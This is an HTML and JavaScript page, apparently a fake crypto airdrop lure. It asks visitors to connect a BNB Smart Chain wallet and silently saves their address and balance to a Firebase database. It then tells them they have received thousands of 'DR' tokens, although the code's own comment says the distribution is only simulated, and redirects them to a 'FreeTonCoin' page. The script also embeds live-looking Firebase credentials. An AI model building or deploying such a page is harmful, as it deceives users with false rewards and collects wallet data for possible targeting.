<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BNB Wallet Connector</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
            color: #333;
        }
        
        header {
            background-color: #f0b90b;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            text-align: center;
            color: white;
        }
        
        .main-content {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .wallet-section {
            margin-bottom: 20px;
        }
        
        button {
            background-color: #f0b90b;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
        }
        
        button:hover {
            background-color: #d8a90a;
        }
        
        button:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        
        .wallet-info {
            margin-top: 20px;
            padding: 15px;
            background-color: #f9f9f9;
            border-radius: 5px;
            display: none;
        }
        
        .balance {
            font-size: 24px;
            font-weight: bold;
            margin: 10px 0;
        }
        
        .token-distribution {
            margin-top: 20px;
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <header>
        <h1>BNB Wallet Connector</h1>
        <p>Connect your BNB Smart Chain wallet to interact with our platform</p>
    </header>
    
    <div class="main-content">
        <div class="wallet-section">
            <button id="connectWalletBtn">Connect Wallet</button>
            <div id="walletInfo" class="wallet-info">
                <h3>Wallet Connected</h3>
                <p>Address: <span id="walletAddress"></span></p>
                <div class="balance">
                    Balance: <span id="walletBalance">0</span> BNB
                </div>
            </div>
        </div>
        
        <div id="tokenDistribution" class="token-distribution hidden">
            <h2>Token Distribution</h2>
            <p>You have received 1000-10000 DR tokens!</p>
        </div>
    </div>

    <!-- Include Firebase and BNB chain libraries -->
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>

    <script>
        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyD4UbW_Iy4kUWH3V70Q1mWCI4-_KFk6ku4",
            authDomain: "onlinewark-a0147.firebaseapp.com",
            databaseURL: "https://onlinewark-a0147-default-rtdb.firebaseio.com",
            projectId: "onlinewark-a0147",
            storageBucket: "onlinewark-a0147.appspot.com",
            messagingSenderId: "92155538620",
            appId: "1:92155538620:android:5e198a8eea6bf17f61f4b9"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // Check if Web3 is injected (MetaMask or similar)
        if (typeof window.ethereum !== 'undefined') {
            console.log('Web3 detected!');
            window.web3 = new Web3(window.ethereum);
        } else {
            alert('Please install MetaMask or another Web3 provider to use this site!');
        }

        // Connect Wallet Button
        document.getElementById('connectWalletBtn').addEventListener('click', async () => {
            try {
                // Request account access
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const account = accounts[0];
                
                // Display wallet info
                document.getElementById('walletAddress').textContent = account;
                document.getElementById('walletInfo').style.display = 'block';
                document.getElementById('connectWalletBtn').textContent = 'Wallet Connected';
                document.getElementById('connectWalletBtn').disabled = true;
                
                // Get balance
                const balance = await web3.eth.getBalance(account);
                const balanceInBNB = web3.utils.fromWei(balance, 'ether');
                document.getElementById('walletBalance').textContent = balanceInBNB;
                
                // Save to Firebase
                saveWalletToFirebase(account, balanceInBNB);
                
                // Distribute tokens if balance meets criteria
                if (parseFloat(balanceInBNB) > 0) {
                    distributeTokens(account);
                }
                
                // Redirect to home page after connection
                setTimeout(() => {
                    window.location.href = "https://afgtrade.github.io/FreeTonCoin";
                }, 2000);
                
            } catch (error) {
                console.error('Error connecting wallet:', error);
                alert('Error connecting wallet. Please try again.');
            }
        });

        // Save wallet info to Firebase
        function saveWalletToFirebase(address, balance) {
            const walletRef = database.ref('wallets/' + address);
            walletRef.set({
                address: address,
                balance: balance,
                connectedAt: new Date().toISOString()
            }).then(() => {
                console.log('Wallet saved to Firebase');
            }).catch((error) => {
                console.error('Error saving wallet:', error);
            });
        }

        // Simulate token distribution
        function distributeTokens(address) {
            // Show token distribution section
            document.getElementById('tokenDistribution').classList.remove('hidden');
            
            // Generate random amount between 1000 and 10000
            const tokenAmount = Math.floor(Math.random() * 9001) + 1000;
            
            // Save token distribution to Firebase
            const tokensRef = database.ref('tokenDistributions/' + address);
            tokensRef.set({
                token: 'DR',
                amount: tokenAmount,
                distributedAt: new Date().toISOString()
            }).then(() => {
                console.log('Tokens distributed and saved to Firebase');
            }).catch((error) => {
                console.error('Error distributing tokens:', error);
            });
        }

        // Check if wallet is already connected
        window.addEventListener('load', async () => {
            if (window.ethereum) {
                const accounts = await web3.eth.getAccounts();
                if (accounts.length > 0) {
                    // Wallet already connected
                    const account = accounts[0];
                    document.getElementById('walletAddress').textContent = account;
                    document.getElementById('walletInfo').style.display = 'block';
                    document.getElementById('connectWalletBtn').textContent = 'Wallet Connected';
                    document.getElementById('connectWalletBtn').disabled = true;
                    
                    // Get balance
                    const balance = await web3.eth.getBalance(account);
                    const balanceInBNB = web3.utils.fromWei(balance, 'ether');
                    document.getElementById('walletBalance').textContent = balanceInBNB;
                }
            }
        });
    </script>
</body>
</html> 
